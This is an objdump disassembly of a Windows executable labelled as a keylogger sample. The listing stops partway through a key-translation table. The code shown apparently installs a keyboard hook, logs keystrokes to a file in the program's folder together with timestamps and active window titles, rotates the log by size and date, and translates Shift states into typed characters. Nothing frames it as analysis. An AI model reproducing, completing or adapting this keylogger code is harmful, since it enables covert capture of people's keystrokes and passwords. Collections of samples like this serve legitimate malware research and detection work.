
malware_samples/keylogger/79d363a163dfb0088545e66404e0213a9e18d5ee66713d7bc906ed97c46b5ca3.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	83 ec 1c             	sub    $0x1c,%esp
  401003:	b9 41 00 00 00       	mov    $0x41,%ecx
  401008:	33 c0                	xor    %eax,%eax
  40100a:	56                   	push   %esi
  40100b:	57                   	push   %edi
  40100c:	bf 10 bb 40 00       	mov    $0x40bb10,%edi
  401011:	68 04 01 00 00       	push   $0x104
  401016:	68 10 bb 40 00       	push   $0x40bb10
  40101b:	50                   	push   %eax
  40101c:	f3 ab                	rep stos %eax,%es:(%edi)
  40101e:	ff 15 04 80 40 00    	call   *0x408004
  401024:	48                   	dec    %eax
  401025:	85 c0                	test   %eax,%eax
  401027:	7e 0f                	jle    0x401038
  401029:	b1 5c                	mov    $0x5c,%cl
  40102b:	38 88 10 bb 40 00    	cmp    %cl,0x40bb10(%eax)
  401031:	74 05                	je     0x401038
  401033:	48                   	dec    %eax
  401034:	85 c0                	test   %eax,%eax
  401036:	7f f3                	jg     0x40102b
  401038:	68 10 bb 40 00       	push   $0x40bb10
  40103d:	c6 80 11 bb 40 00 00 	movb   $0x0,0x40bb11(%eax)
  401044:	e8 a7 00 00 00       	call   0x4010f0
  401049:	bf 70 90 40 00       	mov    $0x409070,%edi
  40104e:	83 c9 ff             	or     $0xffffffff,%ecx
  401051:	33 c0                	xor    %eax,%eax
  401053:	83 c4 04             	add    $0x4,%esp
  401056:	f2 ae                	repnz scas %es:(%edi),%al
  401058:	f7 d1                	not    %ecx
  40105a:	2b f9                	sub    %ecx,%edi
  40105c:	50                   	push   %eax
  40105d:	8b f7                	mov    %edi,%esi
  40105f:	8b d1                	mov    %ecx,%edx
  401061:	bf 10 bb 40 00       	mov    $0x40bb10,%edi
  401066:	83 c9 ff             	or     $0xffffffff,%ecx
  401069:	f2 ae                	repnz scas %es:(%edi),%al
  40106b:	8b ca                	mov    %edx,%ecx
  40106d:	4f                   	dec    %edi
  40106e:	c1 e9 02             	shr    $0x2,%ecx
  401071:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401073:	8b ca                	mov    %edx,%ecx
  401075:	50                   	push   %eax
  401076:	83 e1 03             	and    $0x3,%ecx
  401079:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40107b:	ff 15 00 80 40 00    	call   *0x408000
  401081:	50                   	push   %eax
  401082:	68 f0 12 40 00       	push   $0x4012f0
  401087:	6a 0d                	push   $0xd
  401089:	ff 15 e4 80 40 00    	call   *0x4080e4
  40108f:	8b 35 e8 80 40 00    	mov    0x4080e8,%esi
  401095:	a3 14 bc 40 00       	mov    %eax,0x40bc14
  40109a:	6a 00                	push   $0x0
  40109c:	6a 00                	push   $0x0
  40109e:	8d 44 24 10          	lea    0x10(%esp),%eax
  4010a2:	6a 00                	push   $0x0
  4010a4:	50                   	push   %eax
  4010a5:	ff d6                	call   *%esi
  4010a7:	85 c0                	test   %eax,%eax
  4010a9:	74 2d                	je     0x4010d8
  4010ab:	8b 3d ec 80 40 00    	mov    0x4080ec,%edi
  4010b1:	53                   	push   %ebx
  4010b2:	8b 1d f0 80 40 00    	mov    0x4080f0,%ebx
  4010b8:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  4010bc:	51                   	push   %ecx
  4010bd:	ff d7                	call   *%edi
  4010bf:	8d 54 24 0c          	lea    0xc(%esp),%edx
  4010c3:	52                   	push   %edx
  4010c4:	ff d3                	call   *%ebx
  4010c6:	6a 00                	push   $0x0
  4010c8:	6a 00                	push   $0x0
  4010ca:	8d 44 24 14          	lea    0x14(%esp),%eax
  4010ce:	6a 00                	push   $0x0
  4010d0:	50                   	push   %eax
  4010d1:	ff d6                	call   *%esi
  4010d3:	85 c0                	test   %eax,%eax
  4010d5:	75 e1                	jne    0x4010b8
  4010d7:	5b                   	pop    %ebx
  4010d8:	8b 0d 14 bc 40 00    	mov    0x40bc14,%ecx
  4010de:	51                   	push   %ecx
  4010df:	ff 15 f4 80 40 00    	call   *0x4080f4
  4010e5:	5f                   	pop    %edi
  4010e6:	33 c0                	xor    %eax,%eax
  4010e8:	5e                   	pop    %esi
  4010e9:	83 c4 1c             	add    $0x1c,%esp
  4010ec:	c2 10 00             	ret    $0x10
  4010ef:	90                   	nop
  4010f0:	81 ec 64 02 00 00    	sub    $0x264,%esp
  4010f6:	53                   	push   %ebx
  4010f7:	55                   	push   %ebp
  4010f8:	56                   	push   %esi
  4010f9:	57                   	push   %edi
  4010fa:	b9 40 00 00 00       	mov    $0x40,%ecx
  4010ff:	33 c0                	xor    %eax,%eax
  401101:	8d bc 24 71 01 00 00 	lea    0x171(%esp),%edi
  401108:	c6 84 24 70 01 00 00 	movb   $0x0,0x170(%esp)
  40110f:	00 
  401110:	f3 ab                	rep stos %eax,%es:(%edi)
  401112:	66 ab                	stos   %ax,%es:(%edi)
  401114:	aa                   	stos   %al,%es:(%edi)
  401115:	8b bc 24 78 02 00 00 	mov    0x278(%esp),%edi
  40111c:	83 c9 ff             	or     $0xffffffff,%ecx
  40111f:	33 c0                	xor    %eax,%eax
  401121:	8d 94 24 70 01 00 00 	lea    0x170(%esp),%edx
  401128:	f2 ae                	repnz scas %es:(%edi),%al
  40112a:	f7 d1                	not    %ecx
  40112c:	2b f9                	sub    %ecx,%edi
  40112e:	68 04 91 40 00       	push   $0x409104
  401133:	8b c1                	mov    %ecx,%eax
  401135:	8b f7                	mov    %edi,%esi
  401137:	8b fa                	mov    %edx,%edi
  401139:	8d 94 24 74 01 00 00 	lea    0x174(%esp),%edx
  401140:	c1 e9 02             	shr    $0x2,%ecx
  401143:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401145:	8b c8                	mov    %eax,%ecx
  401147:	33 c0                	xor    %eax,%eax
  401149:	83 e1 03             	and    $0x3,%ecx
  40114c:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40114e:	bf 00 91 40 00       	mov    $0x409100,%edi
  401153:	83 c9 ff             	or     $0xffffffff,%ecx
  401156:	f2 ae                	repnz scas %es:(%edi),%al
  401158:	f7 d1                	not    %ecx
  40115a:	2b f9                	sub    %ecx,%edi
  40115c:	8b f7                	mov    %edi,%esi
  40115e:	8b d9                	mov    %ecx,%ebx
  401160:	8b fa                	mov    %edx,%edi
  401162:	83 c9 ff             	or     $0xffffffff,%ecx
  401165:	f2 ae                	repnz scas %es:(%edi),%al
  401167:	8b cb                	mov    %ebx,%ecx
  401169:	4f                   	dec    %edi
  40116a:	c1 e9 02             	shr    $0x2,%ecx
  40116d:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40116f:	8b cb                	mov    %ebx,%ecx
  401171:	83 e1 03             	and    $0x3,%ecx
  401174:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  401176:	e8 1d 0d 00 00       	call   0x401e98
  40117b:	68 04 91 40 00       	push   $0x409104
  401180:	e8 13 0d 00 00       	call   0x401e98
  401185:	68 04 91 40 00       	push   $0x409104
  40118a:	e8 09 0d 00 00       	call   0x401e98
  40118f:	68 dc 90 40 00       	push   $0x4090dc
  401194:	e8 ff 0c 00 00       	call   0x401e98
  401199:	68 04 91 40 00       	push   $0x409104
  40119e:	e8 f5 0c 00 00       	call   0x401e98
  4011a3:	68 04 91 40 00       	push   $0x409104
  4011a8:	e8 eb 0c 00 00       	call   0x401e98
  4011ad:	68 c4 90 40 00       	push   $0x4090c4
  4011b2:	e8 e1 0c 00 00       	call   0x401e98
  4011b7:	68 04 91 40 00       	push   $0x409104
  4011bc:	e8 d7 0c 00 00       	call   0x401e98
  4011c1:	68 04 91 40 00       	push   $0x409104
  4011c6:	e8 cd 0c 00 00       	call   0x401e98
  4011cb:	68 b0 90 40 00       	push   $0x4090b0
  4011d0:	e8 c3 0c 00 00       	call   0x401e98
  4011d5:	68 04 91 40 00       	push   $0x409104
  4011da:	e8 b9 0c 00 00       	call   0x401e98
  4011df:	68 04 91 40 00       	push   $0x409104
  4011e4:	e8 af 0c 00 00       	call   0x401e98
  4011e9:	68 78 90 40 00       	push   $0x409078
  4011ee:	e8 a5 0c 00 00       	call   0x401e98
  4011f3:	83 c4 34             	add    $0x34,%esp
  4011f6:	8d 44 24 30          	lea    0x30(%esp),%eax
  4011fa:	8d 8c 24 70 01 00 00 	lea    0x170(%esp),%ecx
  401201:	50                   	push   %eax
  401202:	51                   	push   %ecx
  401203:	ff 15 18 80 40 00    	call   *0x408018
  401209:	8b f0                	mov    %eax,%esi
  40120b:	83 fe ff             	cmp    $0xffffffff,%esi
  40120e:	0f 84 8b 00 00 00    	je     0x40129f
  401214:	8b 3d 14 80 40 00    	mov    0x408014,%edi
  40121a:	8b 2d 10 80 40 00    	mov    0x408010,%ebp
  401220:	8b 1d 0c 80 40 00    	mov    0x40800c,%ebx
  401226:	80 7c 24 5c 2e       	cmpb   $0x2e,0x5c(%esp)
  40122b:	75 0e                	jne    0x40123b
  40122d:	8d 54 24 30          	lea    0x30(%esp),%edx
  401231:	52                   	push   %edx
  401232:	56                   	push   %esi
  401233:	ff d7                	call   *%edi
  401235:	85 c0                	test   %eax,%eax
  401237:	74 66                	je     0x40129f
  401239:	eb eb                	jmp    0x401226
  40123b:	6a 07                	push   $0x7
  40123d:	8d 44 24 60          	lea    0x60(%esp),%eax
  401241:	68 70 90 40 00       	push   $0x409070
  401246:	50                   	push   %eax
  401247:	e8 14 0c 00 00       	call   0x401e60
  40124c:	83 c4 0c             	add    $0xc,%esp
  40124f:	85 c0                	test   %eax,%eax
  401251:	75 40                	jne    0x401293
  401253:	f6 44 24 30 10       	testb  $0x10,0x30(%esp)
  401258:	75 39                	jne    0x401293
  40125a:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  40125e:	8d 54 24 34          	lea    0x34(%esp),%edx
  401262:	51                   	push   %ecx
  401263:	52                   	push   %edx
  401264:	ff d5                	call   *%ebp
  401266:	8d 44 24 10          	lea    0x10(%esp),%eax
  40126a:	50                   	push   %eax
  40126b:	ff d3                	call   *%ebx
  40126d:	8b 4c 24 26          	mov    0x26(%esp),%ecx
  401271:	8b 54 24 16          	mov    0x16(%esp),%edx
  401275:	81 e1 ff ff 00 00    	and    $0xffff,%ecx
  40127b:	81 e2 ff ff 00 00    	and    $0xffff,%edx
  401281:	2b d1                	sub    %ecx,%edx
  401283:	83 fa 05             	cmp    $0x5,%edx
  401286:	7c 0b                	jl     0x401293
  401288:	8d 44 24 5c          	lea    0x5c(%esp),%eax
  40128c:	50                   	push   %eax
  40128d:	ff 15 08 80 40 00    	call   *0x408008
  401293:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  401297:	51                   	push   %ecx
  401298:	56                   	push   %esi
  401299:	ff d7                	call   *%edi
  40129b:	85 c0                	test   %eax,%eax
  40129d:	75 87                	jne    0x401226
  40129f:	5f                   	pop    %edi
  4012a0:	5e                   	pop    %esi
  4012a1:	5d                   	pop    %ebp
  4012a2:	5b                   	pop    %ebx
  4012a3:	81 c4 64 02 00 00    	add    $0x264,%esp
  4012a9:	c3                   	ret
  4012aa:	90                   	nop
  4012ab:	90                   	nop
  4012ac:	90                   	nop
  4012ad:	90                   	nop
  4012ae:	90                   	nop
  4012af:	90                   	nop
  4012b0:	53                   	push   %ebx
  4012b1:	56                   	push   %esi
  4012b2:	8b 74 24 0c          	mov    0xc(%esp),%esi
  4012b6:	57                   	push   %edi
  4012b7:	56                   	push   %esi
  4012b8:	e8 98 0c 00 00       	call   0x401f55
  4012bd:	6a 02                	push   $0x2
  4012bf:	6a 00                	push   $0x0
  4012c1:	56                   	push   %esi
  4012c2:	8b f8                	mov    %eax,%edi
  4012c4:	e8 00 0c 00 00       	call   0x401ec9
  4012c9:	56                   	push   %esi
  4012ca:	e8 86 0c 00 00       	call   0x401f55
  4012cf:	6a 00                	push   $0x0
  4012d1:	57                   	push   %edi
  4012d2:	56                   	push   %esi
  4012d3:	8b d8                	mov    %eax,%ebx
  4012d5:	e8 ef 0b 00 00       	call   0x401ec9
  4012da:	83 c4 20             	add    $0x20,%esp
  4012dd:	8b c3                	mov    %ebx,%eax
  4012df:	5f                   	pop    %edi
  4012e0:	5e                   	pop    %esi
  4012e1:	5b                   	pop    %ebx
  4012e2:	c3                   	ret
  4012e3:	90                   	nop
  4012e4:	90                   	nop
  4012e5:	90                   	nop
  4012e6:	90                   	nop
  4012e7:	90                   	nop
  4012e8:	90                   	nop
  4012e9:	90                   	nop
  4012ea:	90                   	nop
  4012eb:	90                   	nop
  4012ec:	90                   	nop
  4012ed:	90                   	nop
  4012ee:	90                   	nop
  4012ef:	90                   	nop
  4012f0:	81 ec 18 01 00 00    	sub    $0x118,%esp
  4012f6:	57                   	push   %edi
  4012f7:	b9 40 00 00 00       	mov    $0x40,%ecx
  4012fc:	33 c0                	xor    %eax,%eax
  4012fe:	8d 7c 24 19          	lea    0x19(%esp),%edi
  401302:	c6 44 24 18 00       	movb   $0x0,0x18(%esp)
  401307:	f3 ab                	rep stos %eax,%es:(%edi)
  401309:	66 ab                	stos   %ax,%es:(%edi)
  40130b:	aa                   	stos   %al,%es:(%edi)
  40130c:	8b 84 24 20 01 00 00 	mov    0x120(%esp),%eax
  401313:	85 c0                	test   %eax,%eax
  401315:	0f 85 f7 09 00 00    	jne    0x401d12
  40131b:	81 bc 24 24 01 00 00 	cmpl   $0x100,0x124(%esp)
  401322:	00 01 00 00 
  401326:	0f 85 e6 09 00 00    	jne    0x401d12
  40132c:	53                   	push   %ebx
  40132d:	55                   	push   %ebp
  40132e:	56                   	push   %esi
  40132f:	68 60 92 40 00       	push   $0x409260
  401334:	68 10 bb 40 00       	push   $0x40bb10
  401339:	e8 69 0e 00 00       	call   0x4021a7
  40133e:	50                   	push   %eax
  40133f:	a3 28 bc 40 00       	mov    %eax,0x40bc28
  401344:	e8 67 ff ff ff       	call   0x4012b0
  401349:	8b 35 0c 80 40 00    	mov    0x40800c,%esi
  40134f:	83 c4 0c             	add    $0xc,%esp
  401352:	3d 00 00 10 00       	cmp    $0x100000,%eax
  401357:	7e 7e                	jle    0x4013d7
  401359:	a1 28 bc 40 00       	mov    0x40bc28,%eax
  40135e:	50                   	push   %eax
  40135f:	e8 cd 0d 00 00       	call   0x402131
  401364:	83 c4 04             	add    $0x4,%esp
  401367:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  40136b:	51                   	push   %ecx
  40136c:	ff d6                	call   *%esi
  40136e:	8b 54 24 1a          	mov    0x1a(%esp),%edx
  401372:	8b 44 24 18          	mov    0x18(%esp),%eax
  401376:	8b 4c 24 16          	mov    0x16(%esp),%ecx
  40137a:	81 e2 ff ff 00 00    	and    $0xffff,%edx
  401380:	52                   	push   %edx
  401381:	8b 54 24 16          	mov    0x16(%esp),%edx
  401385:	25 ff ff 00 00       	and    $0xffff,%eax
  40138a:	81 e1 ff ff 00 00    	and    $0xffff,%ecx
  401390:	50                   	push   %eax
  401391:	81 e2 ff ff 00 00    	and    $0xffff,%edx
  401397:	51                   	push   %ecx
  401398:	52                   	push   %edx
  401399:	68 10 bb 40 00       	push   $0x40bb10
  40139e:	8d 44 24 38          	lea    0x38(%esp),%eax
  4013a2:	68 48 92 40 00       	push   $0x409248
  4013a7:	50                   	push   %eax
  4013a8:	e8 32 0d 00 00       	call   0x4020df
  4013ad:	83 c4 1c             	add    $0x1c,%esp
  4013b0:	8d 4c 24 24          	lea    0x24(%esp),%ecx
  4013b4:	51                   	push   %ecx
  4013b5:	68 10 bb 40 00       	push   $0x40bb10
  4013ba:	ff 15 1c 80 40 00    	call   *0x40801c
  4013c0:	68 60 92 40 00       	push   $0x409260
  4013c5:	68 10 bb 40 00       	push   $0x40bb10
  4013ca:	e8 d8 0d 00 00       	call   0x4021a7
  4013cf:	83 c4 08             	add    $0x8,%esp
  4013d2:	a3 28 bc 40 00       	mov    %eax,0x40bc28
  4013d7:	8b 94 24 34 01 00 00 	mov    0x134(%esp),%edx
  4013de:	33 c0                	xor    %eax,%eax
  4013e0:	8a 02                	mov    (%edx),%al
  4013e2:	89 44 24 20          	mov    %eax,0x20(%esp)
  4013e6:	ff 15 d4 80 40 00    	call   *0x4080d4
  4013ec:	68 04 91 40 00       	push   $0x409104
  4013f1:	a3 20 bc 40 00       	mov    %eax,0x40bc20
  4013f6:	e8 9d 0a 00 00       	call   0x401e98
  4013fb:	68 04 91 40 00       	push   $0x409104
  401400:	e8 93 0a 00 00       	call   0x401e98
  401405:	68 04 91 40 00       	push   $0x409104
  40140a:	e8 89 0a 00 00       	call   0x401e98
  40140f:	68 dc 90 40 00       	push   $0x4090dc
  401414:	e8 7f 0a 00 00       	call   0x401e98
  401419:	68 04 91 40 00       	push   $0x409104
  40141e:	e8 75 0a 00 00       	call   0x401e98
  401423:	68 04 91 40 00       	push   $0x409104
  401428:	e8 6b 0a 00 00       	call   0x401e98
  40142d:	68 c4 90 40 00       	push   $0x4090c4
  401432:	e8 61 0a 00 00       	call   0x401e98
  401437:	68 04 91 40 00       	push   $0x409104
  40143c:	e8 57 0a 00 00       	call   0x401e98
  401441:	68 04 91 40 00       	push   $0x409104
  401446:	e8 4d 0a 00 00       	call   0x401e98
  40144b:	68 b0 90 40 00       	push   $0x4090b0
  401450:	e8 43 0a 00 00       	call   0x401e98
  401455:	68 04 91 40 00       	push   $0x409104
  40145a:	e8 39 0a 00 00       	call   0x401e98
  40145f:	68 04 91 40 00       	push   $0x409104
  401464:	e8 2f 0a 00 00       	call   0x401e98
  401469:	68 78 90 40 00       	push   $0x409078
  40146e:	e8 25 0a 00 00       	call   0x401e98
  401473:	a1 1c bc 40 00       	mov    0x40bc1c,%eax
  401478:	8b 0d 20 bc 40 00    	mov    0x40bc20,%ecx
  40147e:	83 c4 34             	add    $0x34,%esp
  401481:	3b c1                	cmp    %ecx,%eax
  401483:	0f 84 42 01 00 00    	je     0x4015cb
  401489:	b9 32 00 00 00       	mov    $0x32,%ecx
  40148e:	33 c0                	xor    %eax,%eax
  401490:	bf 3c bc 40 00       	mov    $0x40bc3c,%edi
  401495:	68 04 91 40 00       	push   $0x409104
  40149a:	f3 ab                	rep stos %eax,%es:(%edi)
  40149c:	e8 f7 09 00 00       	call   0x401e98
  4014a1:	68 04 91 40 00       	push   $0x409104
  4014a6:	e8 ed 09 00 00       	call   0x401e98
  4014ab:	68 04 91 40 00       	push   $0x409104
  4014b0:	e8 e3 09 00 00       	call   0x401e98
  4014b5:	68 dc 90 40 00       	push   $0x4090dc
  4014ba:	e8 d9 09 00 00       	call   0x401e98
  4014bf:	68 04 91 40 00       	push   $0x409104
  4014c4:	e8 cf 09 00 00       	call   0x401e98
  4014c9:	68 04 91 40 00       	push   $0x409104
  4014ce:	e8 c5 09 00 00       	call   0x401e98
  4014d3:	68 c4 90 40 00       	push   $0x4090c4
  4014d8:	e8 bb 09 00 00       	call   0x401e98
  4014dd:	68 04 91 40 00       	push   $0x409104
  4014e2:	e8 b1 09 00 00       	call   0x401e98
  4014e7:	68 04 91 40 00       	push   $0x409104
  4014ec:	e8 a7 09 00 00       	call   0x401e98
  4014f1:	68 b0 90 40 00       	push   $0x4090b0
  4014f6:	e8 9d 09 00 00       	call   0x401e98
  4014fb:	68 04 91 40 00       	push   $0x409104
  401500:	e8 93 09 00 00       	call   0x401e98
  401505:	68 04 91 40 00       	push   $0x409104
  40150a:	e8 89 09 00 00       	call   0x401e98
  40150f:	68 78 90 40 00       	push   $0x409078
  401514:	e8 7f 09 00 00       	call   0x401e98
  401519:	b9 32 00 00 00       	mov    $0x32,%ecx
  40151e:	33 c0                	xor    %eax,%eax
  401520:	bf 04 bd 40 00       	mov    $0x40bd04,%edi
  401525:	83 c4 34             	add    $0x34,%esp
  401528:	f3 ab                	rep stos %eax,%es:(%edi)
  40152a:	8b 0d 20 bc 40 00    	mov    0x40bc20,%ecx
  401530:	68 00 01 00 00       	push   $0x100
  401535:	68 3c bc 40 00       	push   $0x40bc3c
  40153a:	51                   	push   %ecx
  40153b:	ff 15 d8 80 40 00    	call   *0x4080d8
  401541:	8b 15 20 bc 40 00    	mov    0x40bc20,%edx
  401547:	8d 44 24 10          	lea    0x10(%esp),%eax
  40154b:	50                   	push   %eax
  40154c:	89 15 1c bc 40 00    	mov    %edx,0x40bc1c
  401552:	ff d6                	call   *%esi
  401554:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  401558:	8b 54 24 1a          	mov    0x1a(%esp),%edx
  40155c:	8b 44 24 18          	mov    0x18(%esp),%eax
  401560:	81 e1 ff ff 00 00    	and    $0xffff,%ecx
  401566:	81 e2 ff ff 00 00    	and    $0xffff,%edx
  40156c:	51                   	push   %ecx
  40156d:	8b 4c 24 1a          	mov    0x1a(%esp),%ecx
  401571:	25 ff ff 00 00       	and    $0xffff,%eax
  401576:	52                   	push   %edx
  401577:	8b 54 24 1a          	mov    0x1a(%esp),%edx
  40157b:	50                   	push   %eax
  40157c:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  401580:	81 e1 ff ff 00 00    	and    $0xffff,%ecx
  401586:	81 e2 ff ff 00 00    	and    $0xffff,%edx
  40158c:	51                   	push   %ecx
  40158d:	25 ff ff 00 00       	and    $0xffff,%eax
  401592:	52                   	push   %edx
  401593:	50                   	push   %eax
  401594:	68 1c 92 40 00       	push   $0x40921c
  401599:	68 04 bd 40 00       	push   $0x40bd04
  40159e:	e8 3c 0b 00 00       	call   0x4020df
  4015a3:	8b 0d 28 bc 40 00    	mov    0x40bc28,%ecx
  4015a9:	68 64 90 40 00       	push   $0x409064
  4015ae:	68 3c bc 40 00       	push   $0x40bc3c
  4015b3:	68 04 bd 40 00       	push   $0x40bd04
  4015b8:	68 34 90 40 00       	push   $0x409034
  4015bd:	68 10 92 40 00       	push   $0x409210
  4015c2:	51                   	push   %ecx
  4015c3:	e8 e5 0a 00 00       	call   0x4020ad
  4015c8:	83 c4 38             	add    $0x38,%esp
  4015cb:	8b 3d dc 80 40 00    	mov    0x4080dc,%edi
  4015d1:	6a 10                	push   $0x10
  4015d3:	ff d7                	call   *%edi
  4015d5:	68 04 91 40 00       	push   $0x409104
  4015da:	0f bf f0             	movswl %ax,%esi
  4015dd:	e8 b6 08 00 00       	call   0x401e98
  4015e2:	68 04 91 40 00       	push   $0x409104
  4015e7:	e8 ac 08 00 00       	call   0x401e98
  4015ec:	68 04 91 40 00       	push   $0x409104
  4015f1:	e8 a2 08 00 00       	call   0x401e98
  4015f6:	68 dc 90 40 00       	push   $0x4090dc
  4015fb:	e8 98 08 00 00       	call   0x401e98
  401600:	68 04 91 40 00       	push   $0x409104
  401605:	e8 8e 08 00 00       	call   0x401e98
  40160a:	68 04 91 40 00       	push   $0x409104
  40160f:	e8 84 08 00 00       	call   0x401e98
  401614:	68 c4 90 40 00       	push   $0x4090c4
  401619:	e8 7a 08 00 00       	call   0x401e98
  40161e:	68 04 91 40 00       	push   $0x409104
  401623:	e8 70 08 00 00       	call   0x401e98
  401628:	68 04 91 40 00       	push   $0x409104
  40162d:	e8 66 08 00 00       	call   0x401e98
  401632:	68 b0 90 40 00       	push   $0x4090b0
  401637:	e8 5c 08 00 00       	call   0x401e98
  40163c:	68 04 91 40 00       	push   $0x409104
  401641:	e8 52 08 00 00       	call   0x401e98
  401646:	68 04 91 40 00       	push   $0x409104
  40164b:	e8 48 08 00 00       	call   0x401e98
  401650:	68 78 90 40 00       	push   $0x409078
  401655:	e8 3e 08 00 00       	call   0x401e98
  40165a:	83 c4 34             	add    $0x34,%esp
  40165d:	68 90 00 00 00       	push   $0x90
  401662:	ff d7                	call   *%edi
  401664:	68 04 91 40 00       	push   $0x409104
  401669:	0f bf e8             	movswl %ax,%ebp
  40166c:	e8 27 08 00 00       	call   0x401e98
  401671:	68 04 91 40 00       	push   $0x409104
  401676:	e8 1d 08 00 00       	call   0x401e98
  40167b:	68 04 91 40 00       	push   $0x409104
  401680:	e8 13 08 00 00       	call   0x401e98
  401685:	68 dc 90 40 00       	push   $0x4090dc
  40168a:	e8 09 08 00 00       	call   0x401e98
  40168f:	68 04 91 40 00       	push   $0x409104
  401694:	e8 ff 07 00 00       	call   0x401e98
  401699:	68 04 91 40 00       	push   $0x409104
  40169e:	e8 f5 07 00 00       	call   0x401e98
  4016a3:	68 c4 90 40 00       	push   $0x4090c4
  4016a8:	e8 eb 07 00 00       	call   0x401e98
  4016ad:	68 04 91 40 00       	push   $0x409104
  4016b2:	e8 e1 07 00 00       	call   0x401e98
  4016b7:	68 04 91 40 00       	push   $0x409104
  4016bc:	e8 d7 07 00 00       	call   0x401e98
  4016c1:	68 b0 90 40 00       	push   $0x4090b0
  4016c6:	e8 cd 07 00 00       	call   0x401e98
  4016cb:	68 04 91 40 00       	push   $0x409104
  4016d0:	e8 c3 07 00 00       	call   0x401e98
  4016d5:	68 04 91 40 00       	push   $0x409104
  4016da:	e8 b9 07 00 00       	call   0x401e98
  4016df:	68 78 90 40 00       	push   $0x409078
  4016e4:	e8 af 07 00 00       	call   0x401e98
  4016e9:	83 c4 34             	add    $0x34,%esp
  4016ec:	6a 14                	push   $0x14
  4016ee:	ff d7                	call   *%edi
  4016f0:	81 e6 00 00 00 80    	and    $0x80000000,%esi
  4016f6:	68 04 91 40 00       	push   $0x409104
  4016fb:	81 fe 00 00 00 80    	cmp    $0x80000000,%esi
  401701:	0f bf f8             	movswl %ax,%edi
  401704:	0f 94 c3             	sete   %bl
  401707:	e8 8c 07 00 00       	call   0x401e98
  40170c:	68 04 91 40 00       	push   $0x409104
  401711:	e8 82 07 00 00       	call   0x401e98
  401716:	68 04 91 40 00       	push   $0x409104
  40171b:	e8 78 07 00 00       	call   0x401e98
  401720:	68 dc 90 40 00       	push   $0x4090dc
  401725:	e8 6e 07 00 00       	call   0x401e98
  40172a:	68 04 91 40 00       	push   $0x409104
  40172f:	e8 64 07 00 00       	call   0x401e98
  401734:	68 04 91 40 00       	push   $0x409104
  401739:	e8 5a 07 00 00       	call   0x401e98
  40173e:	68 c4 90 40 00       	push   $0x4090c4
  401743:	e8 50 07 00 00       	call   0x401e98
  401748:	68 04 91 40 00       	push   $0x409104
  40174d:	e8 46 07 00 00       	call   0x401e98
  401752:	68 04 91 40 00       	push   $0x409104
  401757:	e8 3c 07 00 00       	call   0x401e98
  40175c:	68 b0 90 40 00       	push   $0x4090b0
  401761:	e8 32 07 00 00       	call   0x401e98
  401766:	68 04 91 40 00       	push   $0x409104
  40176b:	e8 28 07 00 00       	call   0x401e98
  401770:	68 04 91 40 00       	push   $0x409104
  401775:	e8 1e 07 00 00       	call   0x401e98
  40177a:	68 78 90 40 00       	push   $0x409078
  40177f:	e8 14 07 00 00       	call   0x401e98
  401784:	8b d7                	mov    %edi,%edx
  401786:	83 c4 34             	add    $0x34,%esp
  401789:	83 e2 01             	and    $0x1,%edx
  40178c:	8b c5                	mov    %ebp,%eax
  40178e:	80 fa 01             	cmp    $0x1,%dl
  401791:	0f 94 c1             	sete   %cl
  401794:	83 e0 01             	and    $0x1,%eax
  401797:	3c 01                	cmp    $0x1,%al
  401799:	8b 44 24 20          	mov    0x20(%esp),%eax
  40179d:	0f 94 c2             	sete   %dl
  4017a0:	83 f8 09             	cmp    $0x9,%eax
  4017a3:	75 16                	jne    0x4017bb
  4017a5:	8b 0d 28 bc 40 00    	mov    0x40bc28,%ecx
  4017ab:	68 08 92 40 00       	push   $0x409208
  4017b0:	68 04 92 40 00       	push   $0x409204
  4017b5:	51                   	push   %ecx
  4017b6:	e9 3d 05 00 00       	jmp    0x401cf8
  4017bb:	83 f8 0d             	cmp    $0xd,%eax
  4017be:	75 16                	jne    0x4017d6
  4017c0:	8b 15 28 bc 40 00    	mov    0x40bc28,%edx
  4017c6:	68 fc 91 40 00       	push   $0x4091fc
  4017cb:	68 04 92 40 00       	push   $0x409204
  4017d0:	52                   	push   %edx
  4017d1:	e9 22 05 00 00       	jmp    0x401cf8
  4017d6:	83 f8 30             	cmp    $0x30,%eax
  4017d9:	0f 8c 98 00 00 00    	jl     0x401877
  4017df:	83 f8 39             	cmp    $0x39,%eax
  4017e2:	0f 8f 8f 00 00 00    	jg     0x401877
  4017e8:	84 db                	test   %bl,%bl
  4017ea:	75 0b                	jne    0x4017f7
  4017ec:	50                   	push   %eax
  4017ed:	68 f8 91 40 00       	push   $0x4091f8
  4017f2:	e9 fb 04 00 00       	jmp    0x401cf2
  4017f7:	83 c0 d0             	add    $0xffffffd0,%eax
  4017fa:	83 f8 09             	cmp    $0x9,%eax
  4017fd:	77 5f                	ja     0x40185e
  4017ff:	ff 24 85 44 1d 40 00 	jmp    *0x401d44(,%eax,4)
  401806:	c6 05 2c bc 40 00 21 	movb   $0x21,0x40bc2c
  40180d:	eb 4f                	jmp    0x40185e
  40180f:	c6 05 2c bc 40 00 40 	movb   $0x40,0x40bc2c
  401816:	eb 46                	jmp    0x40185e
  401818:	c6 05 2c bc 40 00 23 	movb   $0x23,0x40bc2c
  40181f:	eb 3d                	jmp    0x40185e
  401821:	c6 05 2c bc 40 00 24 	movb   $0x24,0x40bc2c
  401828:	eb 34                	jmp    0x40185e
  40182a:	c6 05 2c bc 40 00 25 	movb   $0x25,0x40bc2c
  401831:	eb 2b                	jmp    0x40185e
  401833:	c6 05 2c bc 40 00 5e 	movb   $0x5e,0x40bc2c
  40183a:	eb 22                	jmp    0x40185e
  40183c:	c6 05 2c bc 40 00 26 	movb   $0x26,0x40bc2c
  401843:	eb 19                	jmp    0x40185e
  401845:	c6 05 2c bc 40 00 2a 	movb   $0x2a,0x40bc2c
  40184c:	eb 10                	jmp    0x40185e
  40184e:	c6 05 2c bc 40 00 28 	movb   $0x28,0x40bc2c
  401855:	eb 07                	jmp    0x40185e
